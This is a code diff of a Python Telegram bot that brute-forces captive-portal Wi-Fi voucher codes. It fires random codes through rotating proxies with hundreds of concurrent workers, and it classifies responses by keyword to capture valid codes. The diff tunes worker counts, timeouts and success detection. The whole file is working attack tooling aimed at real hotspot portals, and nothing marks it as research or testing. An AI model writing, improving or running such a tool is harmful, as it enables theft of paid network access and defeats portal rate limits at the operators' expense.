@@ -30,7 +30,6 @@ def load_proxies_from_file():
     print("[ProxyManager] Warning: No proxies found in files!")
     return []
 
-# Tracking states
 scanning_states = {}
 user_modes = {}
 user_workers = {}
@@ -51,16 +50,13 @@ def show_startup_banner():
     print("[+] Access Granted!")
     print("[*] Status: Online & Ready")
     print("=" * 65)
-    print("[ProxyManager] Proxy Manager initialized successfully")
-    print("Bot is running with python-telegram-bot...")
-    print("=" * 65)
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     chat_id = update.effective_chat.id
     if chat_id not in user_modes:
         user_modes[chat_id] = "num6"
     if chat_id not in user_workers:
-        user_workers[chat_id] = 300
+        user_workers[chat_id] = 100 # Optimized for stability
     
     if chat_id not in user_proxies or not user_proxies[chat_id]:
         user_proxies[chat_id] = load_proxies_from_file()
@@ -129,9 +125,8 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif data == "change_workers":
         await query.answer()
         keyboard = [
-            [InlineKeyboardButton("300", callback_data="worker_300"), InlineKeyboardButton("500", callback_data="worker_500")],
-            [InlineKeyboardButton("800", callback_data="worker_800"), InlineKeyboardButton("1000", callback_data="worker_1000")],
-            [InlineKeyboardButton("🔙 Back", callback_data="worker_back")]
+            [InlineKeyboardButton("100", callback_data="worker_100"), InlineKeyboardButton("300", callback_data="worker_300")],
+            [InlineKeyboardButton("500", callback_data="worker_500"), InlineKeyboardButton("🔙 Back", callback_data="worker_back")]
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
         await query.message.edit_text("⚙️ Choose Worker Count", reply_markup=reply_markup)
@@ -185,7 +180,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("✅ Portal URL အောင်မြင်စွာ သိမ်းဆည်းပြီးပါပြီ။")
         await start(update, context)
     else:
-        await update.message.reply_text("ℹ️ ကျေးဇူးပြု၍ မီနူးခလုတ်များကို အသုံးပြုပါ။")
+        await update.message.reply_text("ℹ️️ ကျေးဇူးပြု၍ မီနူးခလုတ်များကို အသုံးပြုပါ။")
 
 def generate_code_by_mode(mode):
     length = 6
@@ -194,12 +189,12 @@ def generate_code_by_mode(mode):
             length = int(char)
             break
             
-    if "num" in mode or "Number" in mode:
+    if "num" in mode:
         return "".join(random.choices(string.digits, k=length))
-    elif "mix" in mode or "Mix" in mode:
+    elif "mix" in mode:
         chars = string.ascii_lowercase + string.digits
         return "".join(random.choices(chars, k=length))
-    elif "abc" in mode or "Abc" in mode:
+    elif "abc" in mode:
         return "".join(random.choices(string.ascii_lowercase, k=length))
     else:
         return "".join(random.choices(string.digits, k=length))
@@ -223,26 +218,15 @@ async def worker_task(worker_id, session, portal_url, chat_id):
             
         try:
             target_url = f"{portal_url}&code={code_val}" if "?" in portal_url else f"{portal_url}?code={code_val}"
-            async with session.get(target_url, proxy=proxy, timeout=3.0) as response:
+            async with session.get(target_url, proxy=proxy, timeout=4.0) as response:
                 html_content = await response.text()
                 lower_html = html_content.lower()
                 
-                # ပိုမိုစုံလင်သော Success Keywords များ
-                success_keywords = [
-                    "success", "welcome", "connected", "auth_pass", "login successfully", 
-                    "internet", "minutes", "hours", "remaining", "authenticated", 
-                    "congratulations", "online", "access granted"
-                ]
+                success_keywords = ["success", "welcome", "connected", "auth_pass", "login successfully", "internet", "minutes", "hours", "remaining", "authenticated"]
                 expired_keywords = ["expired", "invalid", "timeout", "used", "incorrect", "wrong"]
                 limit_keywords = ["limit", "already logged", "in use", "too many", "blocked", "restricted", "exceeded"]
                 
-                # အောင်မြင်မှု အခြေအနေစစ်ဆေးခြင်း (Redirect သို့မဟုတ် Success Keywords ပါဝင်ခြင်း)
-                is_success = (
-                    (response.status == 200 and any(kw in lower_html for kw in success_keywords) and "error" not in lower_html and "fail" not in lower_html) or
-                    response.status in [301, 302, 303]
-                )
-
-                if is_success:
+                if response.status == 200 and any(kw in lower_html for kw in success_keywords) and "error" not in lower_html and "fail" not in lower_html:
                     if chat_id not in found_codes:
                         found_codes[chat_id] = []
                     if code_val not in found_codes[chat_id]:
@@ -254,7 +238,7 @@ async def worker_task(worker_id, session, portal_url, chat_id):
                     
         except Exception:
             pass
-        await asyncio.sleep(0.002)
+        await asyncio.sleep(0.01)
 
 async def run_scanner_with_workers(query, context, portal_url):
     chat_id = query.message.chat_id
@@ -265,7 +249,7 @@ async def run_scanner_with_workers(query, context, portal_url):
     limits_counters[chat_id] = 0
     
     start_time = time.time()
-    workers_count = user_workers.get(chat_id, 300)
+    workers_count = user_workers.get(chat_id, 100)
     mode = user_modes.get(chat_id, "num6")
     
     stop_keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("🛑 Stop", callback_data="stop_scanner_btn")]])
@@ -355,4 +339,3 @@ def main():
 
 if __name__ == '__main__':
     main()
-    
